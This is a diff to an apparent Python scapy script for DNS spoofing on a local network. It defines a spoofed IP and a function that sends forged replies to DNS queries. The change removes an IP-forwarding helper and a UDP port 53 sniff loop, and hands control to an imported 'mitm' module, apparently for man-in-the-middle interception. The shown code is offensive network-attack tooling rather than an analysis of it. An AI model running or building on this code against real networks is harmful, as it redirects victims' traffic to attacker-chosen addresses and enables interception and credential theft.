@@ -1,5 +1,7 @@
 #!/usr/bin/env python
 
+import mitm
+
 import logging
 #logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 from scapy.all import *
@@ -12,15 +14,6 @@ import os
 conf.iface = 'mon0'
 spoofed_ip = '192.168.1.7'
 
-def forward_ip(enable=True):
-    with open('/proc/sys/net/ipv4/ip_forward', 'w') as fw:
-        if enable:
-            ret = subprocess.Popen(['echo', '1'], stdout=fw)
-        else:
-            ret = subprocess.Popen(['echo', '0'], stdout=fw)
-        if ret == 1:
-            logging.error("ERROR SETTING IP FORWARDING")
-            sys.exit(1)
 
 def send_response(resp):
     req_domain = resp[DNS].qd.qname
@@ -57,8 +50,9 @@ def send_response(resp):
 
 def main():
     print("Starting...")
-    sniff(prn=lambda x: send_response(x),
-            lfilter=lambda x: x.haslayer(UDP) and x.dport == 53)
+    mitm.main()
+    #sniff(prn=lambda x: send_response(x),
+    #        lfilter=lambda x: x.haslayer(UDP) and x.dport == 53)
 
 if __name__ == "__main__":
     logging.basicConfig(format='%(levelname)s: %(message)s',
